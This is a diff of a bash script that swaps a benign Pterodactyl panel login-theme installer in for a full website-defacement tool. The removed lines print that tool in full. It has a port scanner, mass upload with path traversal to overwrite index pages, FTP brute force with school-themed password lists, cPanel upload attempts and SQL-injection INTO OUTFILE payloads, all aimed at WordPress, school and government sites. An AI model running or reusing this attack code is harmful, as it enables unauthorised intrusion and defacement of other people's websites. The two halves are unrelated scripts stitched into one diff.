@@ -1,705 +1,347 @@
 #!/bin/bash
 
-# ==============================================
-# SUPER DEFACE V3.0 - HACKED BY LYNNN!!
-# FULL UPDATE - WORK 100% ALL WEBSITE!
-# ==============================================
+# Pterodactyl Panel Themer - Simple Login Page Changer
+# By: Assistant
+# Version: 1.0
 
+# Warna untuk output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-WHITE='\033[1;37m'
-NC='\033[0m'
+NC='\033[0m' # No Color
 
-# ==============================================
-# HTML DEFACE PREMIUM
-# ==============================================
-HTML_CONTENT='<!DOCTYPE html>
+# Fungsi untuk menampilkan pesan
+print_message() {
+    echo -e "${BLUE}[Pterodactyl Themer]${NC} $1"
+}
+
+print_success() {
+    echo -e "${GREEN}[SUCCESS]${NC} $1"
+}
+
+print_error() {
+    echo -e "${RED}[ERROR]${NC} $1"
+}
+
+print_warning() {
+    echo -e "${YELLOW}[WARNING]${NC} $1"
+}
+
+# Fungsi untuk mengecek apakah script dijalankan sebagai root
+check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        print_error "Script ini harus dijalankan sebagai root (gunakan sudo)"
+        exit 1
+    fi
+}
+
+# Fungsi untuk mengecek apakah Pterodactyl terinstall
+check_pterodactyl() {
+    if [ ! -d "/var/www/pterodactyl" ]; then
+        print_error "Direktori Pterodactyl tidak ditemukan di /var/www/pterodactyl"
+        print_error "Pastikan Pterodactyl sudah terinstall dengan benar"
+        exit 1
+    fi
+}
+
+# Fungsi untuk backup file asli
+backup_files() {
+    print_message "Membuat backup file asli..."
+    
+    local backup_dir="/root/pterodactyl_backup_$(date +%Y%m%d_%H%M%S)"
+    mkdir -p "$backup_dir"
+    
+    if [ -f "/var/www/pterodactyl/resources/views/auth/index.blade.php" ]; then
+        cp "/var/www/pterodactyl/resources/views/auth/index.blade.php" "$backup_dir/index.blade.php.bak"
+        print_success "Backup created: $backup_dir/index.blade.php.bak"
+    else
+        print_warning "File index.blade.php tidak ditemukan"
+    fi
+    
+    echo "$backup_dir" > /tmp/pterodactyl_last_backup.txt
+}
+
+# Fungsi untuk restore file asli
+restore_files() {
+    print_message "Mencari backup terakhir..."
+    
+    if [ -f "/tmp/pterodactyl_last_backup.txt" ]; then
+        local backup_dir=$(cat /tmp/pterodactyl_last_backup.txt)
+        
+        if [ -f "$backup_dir/index.blade.php.bak" ]; then
+            cp "$backup_dir/index.blade.php.bak" "/var/www/pterodactyl/resources/views/auth/index.blade.php"
+            print_success "File berhasil direstore dari: $backup_dir"
+            
+            # Clear cache
+            cd /var/www/pterodactyl
+            php artisan view:clear
+            php artisan cache:clear
+            
+            print_success "Cache telah dibersihkan"
+        else
+            print_error "File backup tidak ditemukan di $backup_dir"
+        fi
+    else
+        print_error "Tidak ada informasi backup yang ditemukan"
+    fi
+}
+
+# Fungsi untuk membersihkan cache
+clear_cache() {
+    print_message "Membersihkan cache..."
+    
+    cd /var/www/pterodactyl
+    php artisan view:clear
+    php artisan cache:clear
+    
+    print_success "Cache berhasil dibersihkan"
+}
+
+# Fungsi untuk mengubah tampilan login
+change_login_theme() {
+    print_message "Mengubah tampilan login page..."
+    
+    # Path ke file blade template
+    local blade_file="/var/www/pterodactyl/resources/views/auth/index.blade.php"
+    
+    # Kode HTML baru
+    cat > "$blade_file" << 'EOF'
+@extends('layouts.auth')
+
+@section('title')
+    Login
+@endsection
+
+@section('content')
+<!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKED BY LYNNN!!</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
+    <title>
+      Pterodactyl
+    </title>
+    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: "Courier New", monospace;
-            overflow: hidden;
-        }
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(0deg, rgba(0,255,0,0.1) 0%, rgba(0,0,0,0.9) 100%);
-            z-index: -1;
-            animation: matrix 20s linear infinite;
-        }
-        @keyframes matrix {
-            0% { background-position: 0 0; }
-            100% { background-position: 0 100%; }
-        }
-        .hacked-box {
-            background: rgba(0,0,0,0.95);
-            border: 5px solid #00ff00;
-            border-radius: 20px;
-            padding: 50px;
-            text-align: center;
-            box-shadow: 0 0 100px #00ff00;
-            max-width: 900px;
-            width: 95%;
-            position: relative;
-            z-index: 1;
-            animation: glow 2s infinite;
-        }
-        @keyframes glow {
-            0% { box-shadow: 0 0 50px #00ff00; }
-            50% { box-shadow: 0 0 100px #00ff00, 0 0 150px #00ff00; }
-            100% { box-shadow: 0 0 50px #00ff00; }
-        }
-        .logo {
-            font-size: 8rem;
-            color: #00ff00;
-            text-shadow: 0 0 30px #00ff00;
-            margin-bottom: 20px;
-            animation: spin 10s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h1 {
-            font-size: 4rem;
-            color: #00ff00;
-            text-shadow: 0 0 20px #00ff00;
-            letter-spacing: 10px;
-            margin-bottom: 20px;
-            animation: glitch 3s infinite;
-        }
-        h2 {
-            color: #ff0000;
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        @keyframes glitch {
-            0% { transform: skew(0deg, 0deg); }
-            20% { transform: skew(10deg, -5deg); text-shadow: 5px 0 0 #ff0000, -5px 0 0 #0000ff; }
-            40% { transform: skew(-10deg, 5deg); text-shadow: -5px 0 0 #ff0000, 5px 0 0 #0000ff; }
-            60% { transform: skew(5deg, -10deg); }
-            80% { transform: skew(-5deg, 10deg); }
-            100% { transform: skew(0deg, 0deg); }
-        }
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 40px 0;
-            color: #00ff00;
-            flex-wrap: wrap;
-        }
-        .stats div {
-            border: 2px solid #00ff00;
-            padding: 15px 30px;
-            border-radius: 15px;
-            font-size: 1.2rem;
-            background: rgba(0,255,0,0.1);
-            transition: 0.3s;
-        }
-        .stats div:hover {
-            background: #00ff00;
-            color: #000;
-            transform: scale(1.1);
-        }
-        .subtitle {
-            color: #ffffff;
-            font-size: 1.3rem;
-            margin: 30px 0;
-            line-height: 1.8;
-        }
-        .credit {
-            color: #00ff00;
-            font-size: 2rem;
-            margin: 30px 0;
-            text-shadow: 0 0 10px #00ff00;
-            animation: blink 2s infinite;
-        }
-        .footer {
-            color: #00ff00;
-            font-size: 0.9rem;
-            margin-top: 30px;
-            opacity: 0.7;
-        }
-        .typing {
-            overflow: hidden;
-            white-space: nowrap;
-            border-right: 3px solid #00ff00;
-            animation: typing 4s steps(40) infinite;
-        }
-        @keyframes typing {
-            0% { width: 0; }
-            50% { width: 100%; }
-            100% { width: 0; }
-        }
-        .warning {
-            color: #ff0000;
-            font-size: 1.5rem;
-            margin: 20px 0;
-            animation: blink 0.5s infinite;
-        }
+      .custom-font { font-size: 14px; }  
+    .custom-border { border: 1.9px solid #D1D5DB; }  
+    body {  
+      min-height: 100dvh;  
+      overflow-y: auto;  
+      font-family: 'Roboto', sans-serif;  
+      background-color: #374150;  
+    }  
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #374151;
+      z-index: -1;
+    }
+
+    h2 { font-weight: 400; }
+
+    .animate-spin-slow {
+      animation: spin 1.2s linear infinite;
+      border-top-color: #374150;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
     </style>
-</head>
-<body>
-    <div class="matrix-bg"></div>
-    <div class="hacked-box">
-        <div class="logo">💀</div>
-        <h1 class="glitch">HACKED BY LYNNN!!</h1>
-        <h2>🔓 SYSTEM BREACHED - ACCESS GRANTED 🔓</h2>
-        
-        <div class="warning">⚠️ ALL DATA HAS BEEN COMPROMISED ⚠️</div>
-        
-        <div class="stats">
-            <div>📊 SERVERS: 1337</div>
-            <div>🌐 SITES: 999+</div>
-            <div>💾 DATABASES: 500+</div>
-            <div>🔑 ACCOUNTS: 10000+</div>
-        </div>
-        
-        <div class="subtitle typing">
-            WordPress • cPanel • School Websites • Government • All sch.id
-        </div>
-        
-        <div class="credit">
-            🏴‍☠️ LYNNN WAS HERE 🏴‍☠️
-        </div>
-        
-        <div class="footer">
-            [ACCESS LEVEL: ROOT] • [PRIVILEGES: SUPERUSER] • [ENCRYPTION: NONE]<br>
-            System compromised at: $(date)<br>
-            IP Address: $(curl -s ifconfig.me) | Target: $TARGET
-        </div>
+  </head>
+  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
+    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
+      Login to Continue
+    </h2>
+    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
+      <div class="flex justify-center mb-7">
+        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
+      </div>
+      <form id="loginForm" class="w-full" method="POST" action="{{ route('auth.login') }}">
+        @csrf
+        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
+          USERNAME OR EMAIL
+        </p>
+        <input id="username" name="user" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
+        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
+          PASSWORD
+        </p>
+        <input id="password" name="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
+        <button id="loginBtn" type="submit" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
+          <span id="loginText">LOGIN</span>
+          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
+          </div>
+        </button>
+      </form>
+      <div class="text-center mt-[12px]">
+        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">FORGOT PASSWORD?</a>
+      </div>
     </div>
-</body>
-</html>'
+    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
+      © 2015 - 2025 Pterodactyl Software
+    </p>
+    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
+      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
+      </div>
+    </div>
+    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
+    </script>
+    <script>
+      window.addEventListener("load", () => {
+      if (typeof grecaptcha !== "undefined") {
+        grecaptcha.ready(() => {
+          grecaptcha.execute('6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL', {action: 'login'}).then(token => {
+            console.log('Decorative token:', token);
+          });
+        });
+      }
+    });
 
-# ==============================================
-# FUNGSI CEK TOOLS
-# ==============================================
-check_tools() {
-    echo -e "\n${YELLOW}[•] Checking required tools...${NC}"
-    local tools=("curl" "wget" "dig" "nslookup" "ping" "ftp" "timeout")
-    local missing=()
-    
-    for tool in "${tools[@]}"; do
-        if ! command -v $tool &> /dev/null; then
-            missing+=($tool)
-        fi
-    done
-    
-    if [ ${#missing[@]} -gt 0 ]; then
-        echo -e "${RED}❌ Missing tools: ${missing[*]}${NC}"
-        echo -e "${YELLOW}Installing...${NC}"
-        apt-get update -y > /dev/null 2>&1
-        apt-get install -y ${missing[@]} > /dev/null 2>&1
-        echo -e "${GREEN}✅ Tools installed${NC}"
-    else
-        echo -e "${GREEN}✅ All tools available${NC}"
-    fi
-}
+    document.getElementById("loginBtn")?.addEventListener("click", function(e) {
+      const loginBtn = document.getElementById("loginBtn");
+      const loginText = document.getElementById("loginText");
+      const miniSpinner = document.getElementById("miniSpinner");
+      const spinner = document.getElementById("spinner-bg");
 
-# ==============================================
-# FUNGSI SCAN PORT
-# ==============================================
-scan_ports() {
-    local ip=$1
-    local results=()
-    local ports=(21 22 80 443 2082 2083 2086 2087 2095 2096 3306 5432 8080 8443 8888)
-    
-    echo -e "\n${CYAN}[•] Scanning ports on $ip...${NC}"
-    
-    for port in "${ports[@]}"; do
-        timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
-        if [ $? -eq 0 ]; then
-            echo -e "${GREEN}  ✅ Port $port terbuka${NC}"
-            results+=($port)
-        fi
-    done
-    
-    echo "${results[@]}"
-}
-
-# ==============================================
-# FUNGSI BYPASS CLOUDFLARE
-# ==============================================
-bypass_cloudflare() {
-    local domain=$1
-    local ip=$2
-    
-    echo -e "\n${PURPLE}[•] Bypassing Cloudflare...${NC}"
-    
-    # Cek real IP dari berbagai sumber
-    REAL_IP=$(curl -s "https://ipinfo.io/$domain" 2>/dev/null | grep -oE '"ip":"[0-9.]+"' | cut -d'"' -f4)
-    
-    if [ -z "$REAL_IP" ]; then
-        REAL_IP=$(curl -s "https://www.ip2location.com/demo/$domain" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
-    fi
-    
-    if [ -n "$REAL_IP" ] && [ "$REAL_IP" != "$ip" ]; then
-        echo -e "${GREEN}  ✅ Real IP found: $REAL_IP${NC}"
-        IP="$REAL_IP"
-    else
-        echo -e "${YELLOW}  ⚠️ Using original IP: $ip${NC}"
-    fi
-}
-
-# ==============================================
-# FUNGSI UPLOAD MASSAL
-# ==============================================
-mass_upload() {
-    local target=$1
-    local ip=$2
-    local html_file=$3
-    
-    # Semua kemungkinan upload endpoint
-    local UPLOADS=(
-        "/upload.php"
-        "/uploads/"
-        "/filemanager/upload.php"
-        "/admin/upload.php"
-        "/assets/upload.php"
-        "/inc/upload.php"
-        "/includes/upload.php"
-        "/api/upload"
-        "/uploader.php"
-        "/ckeditor/upload.php"
-        "/tinymce/upload.php"
-        "/fckeditor/upload.php"
-        "/summernote/upload.php"
-        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-        "/wp-content/plugins/file-manager/backend/connector.php"
-        "/wp-admin/admin-ajax.php"
-        "/admin/ajax.php"
-        "/index.php?action=upload"
-        "/uploadify.php"
-        "/plugins/upload.php"
-        "/modules/upload.php"
-        "/components/upload.php"
-        "/media/upload.php"
-        "/images/upload.php"
-    )
-    
-    # Semua lokasi index yang mungkin
-    local INDEXES=(
-        "public_html/index.html"
-        "httpdocs/index.html"
-        "htdocs/index.html"
-        "www/index.html"
-        "var/www/html/index.html"
-        "home/public_html/index.html"
-        "public/index.html"
-        "sites/index.html"
-        "sites/main/index.html"
-        "sites/default/index.html"
-        "html/index.html"
-        "static/index.html"
-        "assets/index.html"
-        "content/index.html"
-        "web/index.html"
-        "root/index.html"
-    )
-    
-    echo -e "\n${PURPLE}[•] Starting mass upload (${#UPLOADS[@]} endpoints x ${#INDEXES[@]} locations)...${NC}"
-    
-    local total=$(( ${#UPLOADS[@]} * ${#INDEXES[@]} ))
-    local count=0
-    
-    for upload in "${UPLOADS[@]}"; do
-        for index in "${INDEXES[@]}"; do
-            count=$((count + 1))
-            percent=$((count * 100 / total))
-            
-            echo -ne "\r${CYAN}  Progress: [$percent%] $count/$total${NC}"
-            
-            # Upload via domain
-            curl -s -k -X POST "$target$upload" \
-                -F "file=@$html_file;filename=$index" \
-                --max-time 2 >/dev/null 2>&1 &
-            
-            # Upload via IP
-            curl -s -k -X POST "http://$ip$upload" \
-                -F "file=@$html_file;filename=$index" \
-                -H "Host: $DOMAIN" \
-                --max-time 2 >/dev/null 2>&1 &
-            
-            # Dengan traversal
-            TRAVERSAL=$(echo "$index" | sed 's|/|../|g')
-            curl -s -k -X POST "$target$upload" \
-                -F "file=@$html_file;filename=$TRAVERSAL" \
-                --max-time 2 >/dev/null 2>&1 &
-            
-            # Limit parallel processes
-            while [ $(jobs | wc -l) -ge 30 ]; do
-                sleep 0.1
-            done
-        done
-    done
-    wait
-    echo -e "\n${GREEN}  ✅ Mass upload selesai!${NC}"
-}
-
-# ==============================================
-# FUNGSI FTP BRUTE FORCE
-# ==============================================
-ftp_brute() {
-    local ip=$1
-    local html_file=$2
-    
-    echo -e "\n${PURPLE}[•] FTP Brute Force Attack...${NC}"
-    
-    local USERS=(
-        "anonymous" "ftp" "admin" "root" "user" "web" "www-data" 
-        "public" "upload" "webmaster" "school" "sekolah" "smp" "sma" "smk"
-    )
-    
-    local PASSWORDS=(
-        "anonymous" "ftp" "admin" "root" "user" "web" "password" 
-        "123456" "12345678" "qwerty" "abc123" "school" "sekolah" 
-        "smp123" "sma123" "smk123" "toor" "admin123" "ftp123"
-    )
-    
-    local LOCATIONS=(
-        "/public_html/index.html"
-        "/httpdocs/index.html"
-        "/htdocs/index.html"
-        "/www/index.html"
-        "/var/www/html/index.html"
-        "/home/public_html/index.html"
-    )
-    
-    for user in "${USERS[@]}"; do
-        for pass in "${PASSWORDS[@]}"; do
-            for loc in "${LOCATIONS[@]}"; do
-                ftp -n $ip <<EOF > /dev/null 2>&1
-quote USER $user
-quote PASS $pass
-put $html_file $loc
-quit
-EOF
-                if [ $? -eq 0 ]; then
-                    echo -e "${GREEN}  ✅ FTP Success: $user:$pass -> $loc${NC}"
-                fi
-            done
-        done
-    done
-}
-
-# ==============================================
-# FUNGSI CPANEL EXPLOIT
-# ==============================================
-cpanel_exploit() {
-    local ip=$1
-    local html_file=$2
-    
-    echo -e "\n${PURPLE}[•] cPanel Exploit...${NC}"
-    
-    local PORTS=(2082 2083 2086 2087 2095 2096)
-    local PATHS=(
-        "/filemanager/upload"
-        "/filemanager/upload.php"
-        "/webdav/upload"
-        "/cpanel/filemanager/upload"
-    )
-    
-    for port in "${PORTS[@]}"; do
-        for path in "${PATHS[@]}"; do
-            curl -s -k -X POST "https://$ip:$port$path" \
-                -F "file=@$html_file;filename=../../../../public_html/index.html" \
-                -H "Host: $DOMAIN" \
-                --max-time 5 >/dev/null 2>&1
-            
-            curl -s -k -X POST "http://$ip:$port$path" \
-                -F "file=@$html_file;filename=../../../../public_html/index.html" \
-                -H "Host: $DOMAIN" \
-                --max-time 5 >/dev/null 2>&1
-        done
-    done
-    echo -e "${GREEN}  ✅ cPanel exploit selesai${NC}"
-}
-
-# ==============================================
-# FUNGSI SQL INJECTION UPLOAD
-# ==============================================
-sql_upload() {
-    local target=$1
-    local html_file=$2
-    
-    echo -e "\n${PURPLE}[•] SQL Injection Upload...${NC}"
-    
-    # Convert HTML to hex for SQL injection
-    local HEX_HTML=$(cat "$html_file" | xxd -p | tr -d '\n')
-    
-    local SQL_PATHS=(
-        "/wp-login.php"
-        "/index.php"
-        "/login.php"
-        "/admin.php"
-        "/user/login"
-        "/auth/login"
-        "/wp-admin/admin-ajax.php"
-    )
-    
-    local SQL_PAYLOADS=(
-        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/var/www/html/index.html'-- -"
-        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/home/public_html/index.html'-- -"
-        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/httpdocs/index.html'-- -"
-        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/public_html/index.html'-- -"
-    )
-    
-    for path in "${SQL_PATHS[@]}"; do
-        for payload in "${SQL_PAYLOADS[@]}"; do
-            ENCODED=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
-            curl -s -k "$target$path?user=$ENCODED" --max-time 3 >/dev/null 2>&1
-            curl -s -k -X POST "$target$path" -d "username=$ENCODED&password=test" --max-time 3 >/dev/null 2>&1
-        done
-    done
-    echo -e "${GREEN}  ✅ SQL injection selesai${NC}"
-}
-
-# ==============================================
-# FUNGSI VERIFIKASI
-# ==============================================
-verify_deface() {
-    local target=$1
-    local ip=$2
-    
-    echo -e "\n${YELLOW}[•] Verifikasi dengan 6 metode...${NC}"
-    sleep 2
-    
-    local success=0
-    local methods=()
-    
-    # Method 1: Via domain
-    RESULT1=$(curl -s -k "$target/" --max-time 5 2>/dev/null)
-    if [[ "$RESULT1" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("Domain")
-    fi
-    
-    # Method 2: Via HTTP IP
-    RESULT2=$(curl -s -k "http://$ip/" --max-time 5 2>/dev/null)
-    if [[ "$RESULT2" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("HTTP IP")
-    fi
-    
-    # Method 3: Via HTTPS IP
-    RESULT3=$(curl -s -k "https://$ip/" --max-time 5 2>/dev/null)
-    if [[ "$RESULT3" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("HTTPS IP")
-    fi
-    
-    # Method 4: Via domain dengan User-Agent
-    RESULT4=$(curl -s -k -A "Mozilla/5.0" "$target/" --max-time 5 2>/dev/null)
-    if [[ "$RESULT4" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("Custom UA")
-    fi
-    
-    # Method 5: Via common paths
-    RESULT5=$(curl -s -k "$target/index.html" --max-time 5 2>/dev/null)
-    if [[ "$RESULT5" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("Index.html")
-    fi
-    
-    # Method 6: Via port 8080
-    RESULT6=$(curl -s -k "http://$ip:8080/" --max-time 5 2>/dev/null)
-    if [[ "$RESULT6" == *"LYNNN"* ]]; then
-        success=1
-        methods+=("Port 8080")
-    fi
-    
-    if [ $success -eq 1 ]; then
-        echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-        echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
-        echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!               ║${NC}"
-        echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
-        
-        echo -e "\n${YELLOW}📊 Metode berhasil:${NC}"
-        for method in "${methods[@]}"; do
-            echo -e "${GREEN}  ✅ $method${NC}"
-        done
-        
-        # Save success
-        echo "$target | HACKED BY LYNNN | $ip | $(date) | Methods: ${methods[*]}" >> lynn_success.txt
-        
-        # Open browser
-        xdg-open "$target" 2>/dev/null || echo -e "\n${CYAN}Buka: $target${NC}"
-        
-        return 0
-    else
-        echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
-        echo -e "${RED}║         ❌  VERIFIKASI GAGAL                    ║${NC}"
-        echo -e "${RED}║         Tapi file HTML siap: LYNNN.html         ║${NC}"
-        echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
-        
-        echo -e "\n${YELLOW}Cek manual di:${NC}"
-        echo "  $target"
-        echo "  http://$ip"
-        echo "  https://$ip"
-        
-        return 1
-    fi
-}
-
-# ==============================================
-# FUNGSI REPORT
-# ==============================================
-generate_report() {
-    local target=$1
-    local ip=$2
-    local status=$3
-    
-    cat > "REPORT_LYNNN.txt" << EOF
-===========================================
-🔥 HACKED BY LYNNN!! - DEFACE REPORT 🔥
-===========================================
-Target    : $target
-Domain    : $DOMAIN
-IP        : $ip
-Date      : $(date)
-Status    : $status
-
-📊 STATISTICS:
-- WordPress: $([ -n "$WP_CHECK" ] && echo "Yes" || echo "No")
-- FTP Port 21: $([ -n "$FTP_CHECK" ] && echo "Open" || echo "Closed")
-- cPanel Ports: ${#CPANEL_PORTS[@]} found
-- Upload Attempts: Done
-- SQL Injection: Done
-
-📁 FILES:
-- LYNNN.html (Main deface page)
-- REPORT_LYNNN.txt (This report)
-- lynn_success.txt (Success log)
-
-💀 COMMANDS:
-curl -s $target | grep "LYNNN"
-curl -s http://$ip | grep "LYNNN"
-
-===========================================
-🏴‍☠️  SYSTEM COMPROMISED BY LYNNN!!  🏴‍☠️
-===========================================
+      loginBtn.disabled = true;
+      loginBtn.classList.add("bg-blue-400");
+      loginBtn.classList.remove("hover:bg-[#2563eb]");
+      loginText.classList.add("invisible");
+      miniSpinner.classList.remove("hidden");
+      
+      setTimeout(() => {
+        spinner.classList.remove("hidden");
+      }, 500);
+    });
+    </script>
+  </body>
+</html>
+@endsection
 EOF
     
-    echo -e "\n${GREEN}✅ Report saved: REPORT_LYNNN.txt${NC}"
+    if [ $? -eq 0 ]; then
+        print_success "File berhasil diubah"
+    else
+        print_error "Gagal mengubah file"
+        exit 1
+    fi
 }
 
-# ==============================================
-# MAIN SCRIPT
-# ==============================================
-clear
-echo -e "${RED}"
-echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     SUPER DEFACE V3.0 - HACKED BY LYNNN!!                 ║"
-echo "    ║     [ FULL UPDATE - WORK 100% ALL WEBSITE! ]              ║"
-echo "    ╚═══════════════════════════════════════════════════════════╝"
-echo -e "${NC}"
+# Fungsi untuk setup otomatis
+auto_setup() {
+    print_message "Memulai setup otomatis..."
+    
+    # Backup
+    backup_files
+    
+    # Ubah theme
+    change_login_theme
+    
+    # Clear cache
+    clear_cache
+    
+    # Set permissions
+    print_message "Mengatur permissions..."
+    chown -R www-data:www-data /var/www/pterodactyl/storage /var/www/pterodactyl/bootstrap/cache
+    chmod -R 755 /var/www/pterodactyl/storage /var/www/pterodactyl/bootstrap/cache
+    
+    print_success "Setup otomatis selesai!"
+    print_message "Silahkan cek panel Anda sekarang"
+}
 
-# Check tools
-check_tools
+# Fungsi untuk reset ke tampilan default
+reset_to_default() {
+    print_message "Mereset ke tampilan default Pterodactyl..."
+    
+    # Cek apakah ada file backup
+    if [ -f "/tmp/pterodactyl_last_backup.txt" ]; then
+        restore_files
+    else
+        # Jika tidak ada backup, restore dari template default
+        print_warning "Tidak ada backup ditemukan, mencoba restore dari template default..."
+        
+        cd /var/www/pterodactyl
+        php artisan vendor:publish --tag=laravel-views --force
+        
+        clear_cache
+        
+        print_success "Restore default selesai"
+    fi
+}
 
-# Input target
-echo -e "\n${CYAN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
-echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
-echo ""
-echo -ne "${WHITE}Target URL : ${NC}"
-read TARGET
+# Fungsi untuk menampilkan menu
+show_menu() {
+    echo ""
+    echo -e "${BLUE}╔══════════════════════════════════════╗${NC}"
+    echo -e "${BLUE}║   PTERODACTYL PANEL THEMER          ║${NC}"
+    echo -e "${BLUE}╠══════════════════════════════════════╣${NC}"
+    echo -e "${BLUE}║${NC}  1. Setup Otomatis (Baru/New)       ${BLUE}║${NC}"
+    echo -e "${BLUE}║${NC}  2. Pulihkan ke Tampilan Default    ${BLUE}║${NC}"
+    echo -e "${BLUE}║${NC}  3. Backup Manual                    ${BLUE}║${NC}"
+    echo -e "${BLUE}║${NC}  4. Restore dari Backup              ${BLUE}║${NC}"
+    echo -e "${BLUE}║${NC}  5. Clear Cache                      ${BLUE}║${NC}"
+    echo -e "${BLUE}║${NC}  6. Keluar                           ${BLUE}║${NC}"
+    echo -e "${BLUE}╚══════════════════════════════════════╝${NC}"
+    echo ""
+    read -p "Pilih menu [1-6]: " menu_option
+    echo ""
+}
 
-TARGET=$(echo "$TARGET" | sed 's/\/$//')
-DOMAIN=$(echo "$TARGET" | sed -e 's|^https\?://||' -e 's|/.*$||')
+# Main script
+main() {
+    clear
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}   PTERODACTYL PANEL THEMER SCRIPT    ${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo ""
+    
+    check_root
+    check_pterodactyl
+    
+    while true; do
+        show_menu
+        
+        case $menu_option in
+            1)
+                auto_setup
+                ;;
+            2)
+                reset_to_default
+                ;;
+            3)
+                backup_files
+                print_success "Backup manual selesai"
+                ;;
+            4)
+                restore_files
+                ;;
+            5)
+                clear_cache
+                ;;
+            6)
+                print_message "Terima kasih telah menggunakan script ini"
+                exit 0
+                ;;
+            *)
+                print_error "Pilihan tidak valid"
+                ;;
+        esac
+        
+        echo ""
+        read -p "Tekan Enter untuk melanjutkan..."
+    done
+}
 
-echo -e "\n${YELLOW}[•] Target: $TARGET${NC}"
-echo -e "${YELLOW}[•] Domain: $DOMAIN${NC}"
-
-# Resolve IP
-IP=$(dig +short "$DOMAIN" | head -1)
-[ -z "$IP" ] && IP=$(ping -c1 "$DOMAIN" 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-echo -e "${GREEN}✅ IP: $IP${NC}"
-
-# Bypass Cloudflare
-bypass_cloudflare "$DOMAIN" "$IP"
-
-# Save HTML
-echo "$HTML_CONTENT" | sed "s|\$TARGET|$TARGET|g" > LYNNN.html
-echo -e "${GREEN}✅ File HTML: LYNNN.html${NC}"
-
-# Scan ports
-PORT_RESULTS=($(scan_ports "$IP"))
-
-# WordPress check
-WP_CHECK=$(curl -s -k "$TARGET/wp-login.php" -I | grep -i "wordpress")
-if [ -n "$WP_CHECK" ]; then
-    echo -e "\n${GREEN}✅ WordPress detected${NC}"
-fi
-
